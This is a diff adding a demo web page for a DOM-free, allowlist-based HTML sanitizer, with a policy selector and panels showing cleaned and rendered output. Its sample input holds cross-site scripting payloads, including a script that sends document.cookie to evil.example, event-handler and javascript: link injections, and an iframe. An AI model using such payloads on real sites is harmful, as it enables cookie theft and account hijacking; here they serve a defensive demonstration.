@@ -1,0 +1,73 @@
+<!doctype html>
+<meta charset="utf-8" />
+<title>HTML sanitizing · gowasm</title>
+<link rel="stylesheet" href="../shared/style.css" />
+<main>
+  <a class="back" href="../">← all demos</a>
+  <header>
+    <h1>HTML sanitizing without a DOM</h1>
+    <p>
+      DOMPurify works by handing markup to the browser's own parser, which is
+      fine in a browser and needs jsdom anywhere else. This parses and rewrites
+      the markup directly, so the same code runs in a tab, in Node, and at the
+      edge. It is allowlist based: anything not explicitly permitted is removed.
+    </p>
+  </header>
+
+  <div class="panel">
+    <h2>Untrusted input</h2>
+    <textarea id="input" rows="8" spellcheck="false">&lt;h1&gt;Post title&lt;/h1&gt;
+&lt;p onclick="steal(document.cookie)"&gt;Hello &lt;b&gt;world&lt;/b&gt;&lt;/p&gt;
+&lt;script&gt;fetch("https://evil.example/?c="+document.cookie)&lt;/script&gt;
+&lt;a href="javascript:alert(1)"&gt;click me&lt;/a&gt;
+&lt;a href="https://go.dev"&gt;a real link&lt;/a&gt;
+&lt;img src=x onerror="alert(1)"&gt;
+&lt;iframe src="https://evil.example"&gt;&lt;/iframe&gt;</textarea>
+    <div class="row" style="margin-top:.6rem">
+      <div style="flex:0 0 10rem">
+        <label for="policy">Policy</label>
+        <select id="policy">
+          <option value="basic">basic — comments</option>
+          <option value="article">article — rich text</option>
+          <option value="strict">strict — text only</option>
+        </select>
+      </div>
+    </div>
+  </div>
+
+  <div class="grid2">
+    <div class="panel">
+      <h2>Cleaned markup</h2>
+      <div class="out" id="clean"></div>
+      <p class="status" id="removed"></p>
+    </div>
+    <div class="panel">
+      <h2>Rendered, safely</h2>
+      <div id="rendered" style="border:1px solid var(--line);border-radius:7px;padding:.75rem;min-height:6rem"></div>
+    </div>
+  </div>
+</main>
+
+<script type="module">
+  import { load, onInput } from "../shared/demo.js";
+  const $ = (id) => document.getElementById(id);
+  const api = await load("../_pkg/sanitize/index.browser.js", null);
+
+  async function update() {
+    try {
+      const r = await api.clean($("input").value, $("policy").value);
+      $("clean").textContent = r.html;
+      // Safe by construction: this is the output of the sanitizer, which is
+      // the entire point of the demo.
+      $("rendered").innerHTML = r.html;
+      $("removed").textContent = r.removed.length
+        ? `removed: ${r.removed.join(", ")}  ·  ${r.inputBytes} → ${r.outputBytes} bytes`
+        : `nothing removed  ·  ${r.outputBytes} bytes`;
+    } catch (err) {
+      $("clean").textContent = err.message;
+    }
+  }
+  onInput($("input"), update);
+  $("policy").onchange = update;
+  update();
+</script>
